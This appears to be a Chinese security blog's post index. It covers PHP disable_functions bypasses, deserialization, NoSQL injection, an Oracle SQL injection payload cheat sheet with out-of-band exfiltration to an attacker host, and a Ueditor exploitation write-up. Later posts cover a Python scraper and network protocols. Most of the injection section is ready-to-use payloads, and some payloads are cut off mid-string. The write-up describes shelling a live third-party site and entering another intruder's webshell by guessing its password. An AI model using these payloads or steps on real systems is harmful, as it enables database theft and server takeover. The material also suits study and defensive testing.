1、首先，能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用 2、能够设置环境变量，比如putenv函数未被禁止，就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，导致恶意代码就被注入到程序中 3、当执行未被禁止的PHP函数，并且该函数调用了恶意库中重写的系统函数，就可以达到任意执行系统命令的效果了，因为重写的系统函数中的内容是我们可控的，对这部分内容进行编程即可\n\n\n利用pcntl_exec绕过\n\n\n\n利用imap_open函数任意命令执行(CVE-2018-19518)\n\n\n\n利用系统组件window com绕过 COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成，遵循COM规范编写出来的组件将能够满足对组件架构的所有要求\n前提条件 1、php版本为5.4，高版本扩展要自己添加 2、要在php.ini中开启extension=php_com_dotnet.dll 函数： exec(“cmd /c”.$command); $stdout = $exec-&gt;StdOut(); $stringput = $stdout-&gt;ReadALL(); print($stringput); ?&gt; 使用： com.php?shell=whoami\n\n\n利用Apache+mod_cgi+.htaccess绕过 ModCGI把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行。 .htaccess文件中可以定制用户定义标识头，如果添加Options+ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本，添加AddHandlercgi-script.cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序\n前提条件 1、启用mod-cgi 2、.htaccess可写 3、保证.htaccess可以加载进当前web环境。当apache配置文件中指定web目录下AllowOverride参数值为None时，.htaccess文件无法生效\n\n\n利用ImageMagick漏洞绕过\n\n\n\n利用PHP7.4的FFI绕过利用ShellShock绕过(CVE-2014-6271)\n\n\n\n利用蚁剑插件绕过\n加载插件-&gt;辅助管理-&gt;绕过disable_functions\n\n\n七、反序列化漏洞将对象的状态信息转换为可以存储或传输的形式（字符串）的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。简单的说，序列化就是把一个对象变成可以传输的字符串，可以以特定的格式在进程之间跨平台、安全的进行通信。\n序列化的用途\n方便对象在网络中的传输与存储\n序列化与反序列化的过程：\n序列化：将对象转换为流，利于储存和传输的格式\n反序列化：将流转换为对象\nPHP反序列化\nPHP对象类型数据，反序列化之前，需要对反序列化对象提前定义。\n\n\n\n函数\n说明\n\n\n\nserialize($a)\n序列化\n\n\nunserialize($a)\n反序列化\n\n\n形成原因：\n程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。\n常见的魔法函数介绍\n序列化本身并不存在任何漏洞，但是搭配上PHP的魔法函数，整个程序的执行流程就将变得可控\n\n\n\n函数\n说明\n\n\n\n__construct()\n当一个对象创建时被调用（相当于c++的构造函数）\n\n\n__destruct()\n当一个对象销毁时被调用（相当于c++的析构函数）\n\n\n__sleep()\n在对象被序列化之前被调用\n\n\n__weakup()\n将在unserialize()函数执行反序列化时调用。\n\n\n__toString()\n当一个对象被当作一个字符串时使用\n\n\n注意：\nPHP的反序列化漏洞需要与其他漏洞配合，比如代码执行、代码执行等。\n防御：\n1、要严格过滤用户输入的unserialize函数的参数\n2、要对unserialize后的变量内容进行检查，以确定内容没有被污染\n","categories":["Web渗透"],"tags":["命令执行"]},{"title":"Nosql注入","url":"/article/Nosql%E6%B3%A8%E5%85%A5/","content":"泛指非关系型的数据库，多和关系型数据库共存\n特点：\n不要预定义表，可以存储非结构化数据，数据量大，用于模糊处理，使用灵活，可拓展等\n代表数据库：\nMongoDB（默认端口号27017）、Redis（默认端口号：6379）、Memcache\n数据类型：\n\n\n\n类型\n用法\n说明\n\n\n\n布尔型\n{“a”:true}\n与java的boolean一样\n\n\nNull\n{“a”:null}\nnull表示空值或者不存在的字段\n\n\n数值\n{“a”:1.34}{“a”:NumberInt(“3”)} 表示4字节的整数\n不区分整数或浮点\n\n\n字符串\n{“a”:”string”}\nUTF-8的字符串\n\n\n日期\n{“a”:newDate()}\n\n\n\n数组\n{“a”:[“b”,”c”,”d”]}\n\n\n\n内嵌文档\n{“a”:{“b”:”c”:”d”}}\n\n\n\n对象id\n{“a”:ObjectID()}\n对象id一个12字节的ID，文档的唯一表示，对象的默认主键_id就是一个对象id\n\n\nMongoDB操作\n\n\n操作\n语句\n\n\n\n开启服务\nsudo mongod\n\n\n登陆mongodb数据库\nmongo –host 127.0.0.1\n\n\n数据库的操作\n\n\n\n操作\n语句\n\n\n\n查看所有的数据库\nshow dbs\n\n\n切换数据库\nuse 数据库名\n\n\n查看集合\nshow collections\n\n\n数据库的创建\nuser数据库名。有值自动创建，当use的时候，系统就会自动创建一个数据库。\n\n\n删除数据库\n进入数据库后db.dropDatabase(); 注意：如果没有选择任何数据库，会删除默认的test数据库\n\n\n集合的操作\n\n\n\n操作\n语句\n\n\n\n查看集合\nshow collections\n\n\n创建集合\ndb.createCollection(“xxx”)\n\n\n删除集合\ndb.xxx.drop()\n\n\n文档(行)的增删改\n\n\n\n操作\n语句\n\n\n\n增加数据\ndb.xx.insert({key:value}) 举例：db.ichunqiu.insert({_id:1,name:”web”,age:10})\n\n\n删除数据\ndb.xx.remove(删除的条件) 1、全部删除： db.xx.remove({})  2、根据条件删除，默认是删除所有符合条件的数据： db.xx.remove({age:10})  3、只删除符合条件的第一个： db.xx.remove({gender:true},{justOne:true})\n\n\n更改操作\ndb.xx.update({查找的条件}，{修改的内容}) 1、修改内容： 默认其他原有字段删除了，替换掉原有数据db.xx.update({age:10},{name:”NoSQL ”})  2、保持原有的字段，加一个修饰$set： 默认只修改第一个且对已存在的原有属性是替换，不存在的属性是添加db.stu.update({age:10},{$set:{like:“study”}}) 说明：把like:”study”添加到数据里面，并不是替换\n\n\n文档查询简单语句：\n\n\n\n操作\n语句\n\n\n\n基本查询\ndb.xx.find({查询条件}) 1、查询所有的数据： db.xx.find() 或db.xx.find({})  2、默认查出所有符合条件的数据： db.xx.find({age:10})  3、查找符合条件的第一个： db.xx.findOne({age:10})  4、格式化输出——pretty()函数： db.xx.find({age:10}).pretty()\n\n\n条件查询\n举例： db.xx.find({age:{$lt:20}}) 查询年龄小于20岁的 db.xx.find({age:{$ne:18}}) 查询年龄不等于18的\n\n\n逻辑运算\n$and，$or 1、$and： 默认的的查询条件就是且的关系 举例： db.xx.find({age:28,gender:true})db.xx.find({$and:[{age:28},{gender:true}]}) 查询年龄是28岁且性别为女  2、$or：或的关系 举例：db.xx.find({$or:[{age:{$lt:30}},{gender:false}]}) 查询年龄小于30岁，或者性别为男\n\n\n条件查询–常用条件：\n\n\n\n函数\n字符\n\n\n\n$lt\n&lt;\n\n\n$ne\n!=\n\n\n$or\nor\n\n\n$lte\n&lt;=\n\n\n$in\nin\n\n\n$not\n反匹配(1.3.3及以上版本)\n\n\n$gt\n&gt;\n\n\n$nint\nnot in\n\n\n$regex\n正则\n\n\n$gte\n&gt;=\n\n\n$all\nall\n\n\nNosql注入\n\n\n分类\n说明\n\n\n\n综合分类（4种）\n重言式/永真式（重要） JavaScript注入（难度较大） 联合查询注入（被淘汰） mongo shell拼接注入（难度中等，危害大）\n\n\n语言、代码逻辑角度分类（3种）\nPHP数组注入 JS注入 Mongo shell拼接注入\n\n\n攻击手段角度分类（3种）\n重言式（永真式） 联合查询 JavaScript注入\n\n\n\n\n\n分类\n说明\n\n\n\n重言式/永真式\n/login.php?username[$ne]=1&amp;password[$ne]=1 防御： 可以通过函数is_array()将输入参数转变为字符串类型来解决 如：db-&gt;logins-&gt;find(array(&quot;username&quot;=&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;=&gt;(string)$_POST[&quot;password&quot;])); 注意： 1、必须要结合PHP语言才能导致重言式注入（依据PHP语言的特性） 2、如果是POST方法传参，可以结合BurpSuite抓包、改包进行绕过。 3、使用正则表达式,也可以构造永真式如：username[$regex]=.?&amp;password[$regex]=.?.?为匹配所有字符串变为 ?username[$regex]=^a&amp;password[$regex]=.? 不断爆破a即可，^ab…直到爆不出，爆破字符为数字字母符号，符号需要转义\n\n\nJavaScript注入\n&#39;;return true;var a=&#39; 注入产生的原因 1、MongoDB中$where操作符是可以执行JavaScript语句的。 2、在PHP语言中是不能直接写入JavaScript语句的，需要写在字符串中。使用字符串就会引用到单引号和双引号，因此容易出现闭合的问题 3、在MongoDB 2.4之前，通过$where操作符使用map-reduce、group命令可以访问到mongo shell中的全局函数和属性。也就是说可以操作数据库中的数据。  注意： 1、闭合的方法有很多，只要return的值为真即可。 2、该注入方法较难，主要是因为payload不易构造，在有源码的情况下容易构造闭合语句，没有源码只能猜测。 3、$where执行的JavaScript语句只能进行简单的逻辑操作。\n\n\nmongo shell拼接注入\n&quot;&#125;);db.表名.insert(&#123;&quot;name&quot;:&quot;hi&quot;&#125;);db.表名.find(&#123;&quot;author&quot;:&quot;1 在两个db.message.find中间的位置，插入任意想要执行的代码  产生的原因： PHP中，通过executeCommand可以执行shell命令，可以直接执行语句。同样是存在字符串拼接的问题，因此通过使用单引号、双引号构造闭合语句，就可以执行任意的语句。\n\n\n","categories":["Web渗透"],"tags":["Nosql"]},{"title":"Oracle注入","url":"/article/Oracle%E6%B3%A8%E5%85%A5/","content":"端口：1521\n使用\nselect * from dual; dual是oracle数据库中的虚拟表，用于占位查询\n注释：--\nchr(126)为~，为分隔符\nutl_url.escape() url编码\n对限定条件进行编码，解决dns外带乱码问题\n&lt;&gt;可替代not in，用于嵌套查询，但是可用limit代替\n一、union联合注入\n\n\n方法\n语句\n\n\n\n判断注入\n&#39;、&quot;、\\、and 1=1、and 1=2\n\n\n判断数据库类型\n返回正常为oracle数据库 and len(&#39;a&#39;) = 1         长度函数 and exist(select * from dual)       dual表and (select count(*) from user_tables)&gt;0 --     user_tables 系统表\n\n\n判断列数\norder by\n\n\n判断占位符\noracle数据库需要查询类型与表结构类型匹配，否则报错 使用时查询出一个数字型和一个字符型显示位即可，其余位用null占位如： union select 1,&#39;2&#39;,null,null from dual--\n\n\n获取基本信息\n获取数据库版本 union select 1,(select banner from sys.v_$version where rownum=1),3,4 from dual--  获取数据库连接用户名 union select 1,(select sys_context(&#39;USERENV&#39;,&#39;CURRENT_USER&#39;) from dual),3,4 from dual-- 或 union select 1,(select user from dual),3,4 from dual--  获取日志文件绝对路径 union select 1,(select instance_name from v$instance),3,4 from dual--\n\n\n查用户\nunion select 1,cast(owner as varchar(4000)),3,4 from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1--rownum：隐藏的行号\n\n\n查表名\nunion select 1,cast(table_name as varchar(4000)),3,4 from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1-- \n\n\n查列名\nunion select 1,cast(column_name as varchar(4000)),3,4 from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1--\n\n\n查数据\nunion select 1,cast(name,pwd as varchar(4000)),3,4 from (select name,pwd,rownum as limit from (select * from 列名)) where limit=1 --\n\n\n二、报错注入常用报错函数\n\n\n\n函数\n说明\n\n\n\ndbms_xdb_version.checkin()\n检入签出的VCR并返回新创建的版本的资源ID and (select dbms_xdb_version.checkin((select user from dual))from dual)is not null\n\n\ndbms_xdb_version.uncheckout()\n同checkin and (select dbms_xdb_version.uncheckout((select user from dual))from dual)is not null\n\n\nutl_inaddr.get_host_name()\n在Oracle 11g及以后的版本中需要网络访问权限才可以使用 获取ip地址，其参数如果解析不了会报错 and utl_inaddr.get_host_name((select user from dual))=1--\n\n\ndbms_xdb_version.makeversioned()\nand (select dbms_xdb_version.makeversioned((select user from dual))from dual)is not null--\n\n\ndbms_utility.sqlid_to_sqlhash()\nand (select dbms_utility.sqlid_to_sqlhash((select user from dual))from dual)is not null--\n\n\nordsys.ord_dicom.getmappingxpath()\nand ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)=1--\n\n\nctxsys.drithsx.sn()\nand ctxsys.drithsx.sn(1,(select user from dual))=1--\n\n\n过程\n\n\n\n方法\n语句\n\n\n\n获取数据库版本\nand(select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1))from dual)is not null--\n\n\n获取用户名\nand (select dbms_xdb_version.checkin((select user from dual))from dual)is not null-- 或and (select dbms_xdb_version.checkin((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1)) from dual) is not null --\n\n\n获取表名\nand (select dbms_xdb_version.checkin((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1)) from dual) is not null --\n\n\n获取列名\nand (select dbms_xdb_version.checkin((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1)) from dual) is not null --\n\n\n获取数据\n`and(select dbms_xdb_version.checkin((select AGE\n\n\n三、布尔盲注相关函数\n\n\n\n函数\n说明\n\n\n\ndecode()\nif(条件==值1)正确返回翻译值1，否则返回默认值 decode(条件,值1,翻译值1,值2,翻译值2,…值n,翻译值n,缺省值)\n\n\ninstr()\n返回发现指定的字符的位置 instr(string1,string2)instr(源字符串,目标字符串)\n\n\n1、猜解法\n\n\n\n方法\n语句\n\n\n\n判断用户名\nand (select ascii(substr(user,1,1))from dual)&gt;1-- 或 and (select ascii(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1))from dual)&gt;1--\n\n\n判断表名\nand (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)&gt;1--\n\n\n判断列名\nand (select ascii(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1))from dual)&gt;1--\n\n\n判断数据\n`and (select ascii(substr((select AGE\n\n\n2、decode\n\n\n\n方法\n语句\n\n\n\n判断用户名\nand(select decode(substr(user,1,1),&#39;T&#39;,1,0)from dual)-- T为猜解的字母或 and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--\n\n\n判断表名\nand(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--\n\n\n判断字段名\nand(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--\n\n\n判断数据\nand(select decode(substr((select AGE from (select AGE,rownum as limit from (select * from 字段名)) where limit=1),1,1),&#39;T&#39;,1,0)from dual)--\n\n\n3、instr\n\n\n\n方法\n语句\n\n\n\n判断用户名\nand (instr((select user from dual),&#39;T&#39;))-- 或 and(instr((select (select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1) from dual),&#39;T&#39;))--\n\n\n判断表名\nand (instr((select (select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1) from dual),&#39;T&#39;))--\n\n\n判断列名\nand (instr((select (select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1) from dual),&#39;T&#39;))--\n\n\n判断数据\nand (instr((select (select AGE from (select AGE,rownum as limit from (select * from 列名)) where limit=1) from dual),&#39;T&#39;))--\n\n\n四、延时盲注相关函数\n\n\n\n函数\n语句\n\n\n\ndecode()\ndecode(condition,value,dbms_pipe.receive_message(&#39;ICQ&#39;,5),0)\n\n\nDBMS_PIPE.RECEIVE_MESSAGE()\nDBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;,延迟时间) and dbms_pipe.receive_message(&#39;ICQ&#39;,5)=1\n\n\n\n\n\n方法\n语句\n\n\n\n判断用户名\nand(select decode(substr(user,1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1-- 或 and(select decode(substr((select owner from (select owner,rownum as limit from (select distinct(owner) from sys.all_tables)) where limit=1),1,1),’T’,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--\n\n\n判断表名\nand(select decode(substr((select table_name from (select table_name,rownum as limit from (select distinct(table_name) from user_tables)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--\n\n\n判断列名\nand(select decode(substr((select column_name from (select column_name,rownum as limit from (select distinct(column_name) from user_tab_columns where table_name=&#39;表名&#39;)) where limit=1),1,1),&#39;T&#39;,dbms_pipe.receive_message(&#39;ICQ&#39;,3),0)from dual)=1--\n\n\n判断数据\n\n\n\n五、DNS外带DNS外带函数\n\n\n\n函数\n说明\n\n\n\nUTL_HTTP.REQUEST\n用于取得web服务器的请求信息 select UTL_HTTP.REQUEST(&#39;http://www.baidu.com&#39;) from dual 返回百度的html源码\n\n\nUTL_INADDR.GET_HOST_ADDRESS\n\n\n\nSYS.DBMS_LDAP.INIT\n\n\n\n外带注入过程\n\n\n\n方法\n语句\n\n\n\n检测函数是否可用\nand exists(select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;)-- 回显正常则可用\n\n\n开启本地监听\npython -m http.server 1111\n\n\n反弹信息\n`and UTL_HTTP.request(‘http://ip:监听端口/&#39;\n\n\n","categories":["Web渗透"],"tags":["Oracle"]},{"title":"Ueditor漏洞复现","url":"/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","content":"一、简介闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。\n\n二、漏洞复现1、发现存在ueditor文本编辑器\n \n2、漏洞探测\n访问url\n/usditor/net/controller.ashx?action=catchimage\n\n返回\n&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;\n\n说明存在编辑器文件上传漏洞。\n\n3、构造上传入口\n&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;\n\n注：action的通用地址应为：\nhttp://xxx.com/ueditor/net/controller.ashx?action=catchimage\n\n\n4、上传公网服务器aspx图片马，并用?.aspx连接，即http://x/x.jpg?.aspx\n\n注：必须为公网服务器\n5、返回图片马路径\n应为/usditor/net/upload/image/20210729/6376...09895.aspx\n\n6、蚁剑连接，getshell\n \n三、总结这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。\n1、服务器必须为国内公网服务器，不然会上传失败。\n2、返回的路径/upload/image/20210729/6376...09895.aspx为当前目录下的路径，即/usditor/net/upload/image/20210729/6376...09895.aspx,前面如有路径都应加上，而不是根目录下的upload路径。\n3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了\n哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。\n \n————————————————————————————————————————————————————————————\n嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。\n","categories":["漏洞复现"],"tags":["Ueditor"]},{"title":"Python之网络爬虫","url":"/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/","content":"一、简介借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。\n二、模块梳理requests模块介绍：发送简单请求，获取响应\n使用：\nimport requests\t\t\t\t# 导包res = requests.get(url)\t\t# 发送get请求包（可换成.post）res.text\t\t\t\t\t# 获取返回包内容res.request\t\t\t\t\t# 获取请求包内容res.encoding  \t\t\t\t# 获取页面编码格式res.content\t\t\t  \t\t# http响应内容的二进制形式res.status_code\t\t\t\t# http响应码，200响应成功，404失败\n\nBeautifulSoup模块介绍：用于解析html/xml。\n使用\nfrom bs4 import BeautifulSoup\t\t\t\t# 导包soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)\t\t# 获取html属性soup.title\t\t\t\t\t\t\t\t\t# 获取其中title内容,包括标签soup.title.string\t\t\t\t\t\t\t# 仅获取titlesoup.select\t\t\t\t\t\t\t\t\t# 指定某个元素下某个标签\tsoup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)\t同\tsoup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)soup.text\t\t\t\t\t\t\t\t\t# 获取标签内容find_all\t\t\t\t\t\t\t\t\t# 查找所有符合条件的元素find\t\t\t\t\t\t\t\t\t\t# 匹配第一个元素\n\n三、代码#!/usr/bin/python# -*- coding: utf-8 -*-&quot;&quot;&quot;    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用    author：chen    date:2021-6-27&quot;&quot;&quot;import requestsfrom bs4 import BeautifulSoup# 自定义请求头headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;&#125;def page_link(url):    con = &#x27;&#x27;    reponse = requests.get(url=url, headers=headers)    # 获取当前页面编码格式    code = reponse.encoding    # 对响应包的内容解码    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)    # 使用bs获取指定标签内容（需绑定解析器lxml）    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)    for i in soup:        # print(i.text)        con = con + i.text    return con# 程序入口if __name__ == &quot;__main__&quot;:    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址    reponse = requests.get(url=url, headers=headers)            # 获取请求    # print(reponse.text)    code = reponse.encoding                                     # 获取编码方式    # code = reponse.apparent_encoding    # print(code)    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码    # print(page_text)    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息    # print(aAttr)    for i in aAttr:        # print(i.text)        title = i.text        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接        content = page_link(link)        print(&#x27;开始下载 \\n&#x27; + title)        # print(title)        # print(link)        # print(content)        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:            fp.write(title + &#x27;\\n&#x27; + content + &#x27;\\n\\n\\n&#x27;)            print(title + &#x27;\\n&#x27; + &#x27;下载结束&#x27; + &#x27;\\n&#x27;)\n\n4、下载https://www.zerochen.top/download/Scan/pc_sg.py\n","categories":["Python"],"tags":["爬虫"]},{"title":"网络协议基础","url":"/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/","content":"ARP协议简介：\n将IP地址解析为以太网MAC地址（物理地址）的协议。ARP协议有‘IP，MAC’映射关系表，生存时间20分钟\n通过arp -a查看\n工作流程：\n1、在局域网发送包含IP地址的广播数据报，请求MAC地址\n2、局域网内所有主机均会接收并处理报文；符合IP的主机处理请求，其余丢弃报文\n3、验证成功返回ARP单播数据报，包含自己的IP和MAC地址\nARP报文格式\n \n\n\n\n\n\n\n\n\n硬件类型：\n16位字段，用来定义运行ARP的网络类型。每个局域网基于其类型被指派一个整数。例如：以太网的类型为1。ARP可用在任何物理网络上。\n\n\n协议类型：\n16位字段，用来定义使用的协议。例如：对IPv4协议这个字段是0800。ARP可用于任何高层协议\n\n\n硬件长度：\n8位字段，用来定义物理地址的长度，以字节为单位。例如：对于以太网的值为6。\n\n\n协议长度：\n8位字段，用来定义逻辑地址的长度，以字节为单位。例如：对于IPv4协议的值为4。\n\n\n操作码：\n16位字段，用来定义报文的类型。已定义的分组类型有两种：ARP请求（1），ARP响应（2）。\n\n\n源硬件地址：\n这是一个可变长度字段，用来定义发送方的物理地址。例如：对于以太网这个字段的长度是6字节。\n\n\n源逻辑地址：\n这是一个可变长度字段，用来定义发送方的逻辑（IP）地址。例如：对于IP协议这个字段的长度是4字节。\n\n\n目的硬件地址：\n这是一个可变长度字段，用来定义目标的物理地址，例如，对以太网来说这个字段位6字节。对于ARP请求报文，这个字段为全0，因为发送方并不知道目标的硬件地址。\n\n\n目的逻辑地址：\n这是一个可变长度字段，用来定义目标的逻辑（IP）地址，对于IPv4协议这个字段的长度为4个字节。\n\n\nIP协议简介：\nTCP/IP协议核心协议。规定了IP数据报文\nIP报文格式\n \n\n\n\n\n\n\n\n\n版本：\n包含IP数据报的版本号：ipv4为4，ipv6为6\n\n\n首部长度：\n其中保存的是整个首部中的“32位字”的数量。\n\n\n这个字段正常的值为：\n5（假设“可选字段长度为0”）\n\n\n该字段最大值为：\n15（可选字段长度全满加上原有字段）\n\n\n区分服务：\n优先级（3位)和数据链路层的QoS机制有关，定义了8个服务级别。当Qos选择了某种服务模型后，优先级越高，字段越优先传输。 D、T、R分别表示延时、吞吐量、可靠性。当这些值都为1时，分别表示低延时、高吞吐量、高可靠性。\n\n\nECN：\n用于为数据报标记“拥塞标识符”。 当一个带有ECN标记的分组发送后，如果接收端“持续拥塞”且“具有感知ECN的能力”（如TCP），那么接收端会通知发送端降低发送速度。\n\n\n总长度：\n该字段指的是IPv4数据报的总长度（以字节为单位）。 通过该字段和“首部长度”字段，我们可以推测出ip数据报中“数据部分”从哪开始以及长度。\n\n\n标识、标志、分偏移：\n该字段帮助标识由IPv4主机发送的数据报。 这个字段对实现分片很重要，大多数数据链路层不支持过长的ip数据报，所以要把ip数据报分片，每一片都是一个独立的ipv4数据报。 发送主机每次发送数据报都讲一个“内部计数器”加1，然后将数值复制“标识”字段中。\n\n\n生存时间：\n该字段用于设置一个“数据报可经过的路由器数量”的上限。 发送方在初始发送时设定某个值（建议为64,、128或255），每台路由器再转发时都将其减一，当字段达到0时，该数据报被丢弃，并使用一个ICMP消息通知发送方。\n\n\n协议：\n包含一个数字，该数字对应一个“有效载荷部分的数据类型”。比如17代表UDP，6代表TCP。\n\n\n首部校验和：\n该字段“仅计算”IPv4首部。也就是说只“校验”首部。并不检查数据报的“数据部分”。 首先将“首部校验和”设置为0,。 然后对首部（整个首部是一个16位字的“序列”）计算16位二进制反码和。该值被存储在首部校验和字段中。 当接收方接收到数据报后，也对其首部进行校验计算，如果结果与“首部校验和”的值不同，就丢弃收到的数据报。\n\n\n可选字段：\nIP支持很多可选选项。 如果选项存在的话，它在IPv4分组中紧跟在基本IPv4头部之后。\n\n\nICMP协议简介：\nIPV4协议簇中的一个子协议，用于在IP主机、路由器之间传递控制消息。如网络通不通、主机是否可达、路由是否可用等网络本身消息。\nICMP报文格式\n \n\n\n\n\n\n\n\n\n类型：\n占一字节，标识ICMP报文的类型，目前已定义了14种，从类型值来看ICMP报文可以分为两大类。第一类是取值为1~127的差错报文，第2类是取值128以上的信息报文。\n\n\n代码：\n占一字节，标识对应ICMP报文的代码。它与类型字段一起共同标识了ICMP报文的详细类型。\n\n\n校验和：\n占2个字节，包括数据在内的整个ICMP数据包的检验和，以检验报文在传输过程中是否出现了差错；其计算方法和IP头部检验和的计算方法一样的。\n\n\n标识：\n占两字节，用于标识本ICMP进程，但仅适用于回显请求和应答ICMP报文，对于目标不可达ICMP报文和超时ICMP报文等，该字段的值为0。\n\n\n序列号：\n每一个ICMP回显报文都有一个序列号且是递增的\n\n\n数据：\n表示是一个32字节的数据\n\n\nICMP报文的前4个字节是统一的格式，共有三个字段：即类型，代码和检验和。8位类型和8位代码字段一起决定了ICMP报文的类型。类型8，代码0：表示回显请求(ping请求)。类型0，代码0：表示回显应答(ping应答)。类型11，代码0：超时。\n\n\n\n类型（十进制）\n内容\n\n\n\n0\n回送应答\n\n\n3\n目标不可达\n\n\n4\n原点抑制\n\n\n5\n重定向或改变路由\n\n\n8\n回送请求\n\n\n9\n路由器公告\n\n\n10\n路由器请求\n\n\n11\n超时\n\n\n17\n地址子网请求\n\n\n18\n地址子网应答\n\n\nTCP协议简介：\nTCP是一种面向连接的、可靠的、基于字节流的传输层通信协议；是TCP/IP协议体系中最主要的传输层协议。\nTCP报文格式\n\n\n\n\n\n\n\n\n\n源、目标端口号字段：\n占16比特。TCP协议通过使用”端口”来标识源端和目标端的应用进程。端口号可以使用0到65535之间的任何数字。在收到服务请求时，操作系统动态地为客户端的应用程序分配端口号。在服务器端，每种服务在”众所周知的端口”（Well-Know 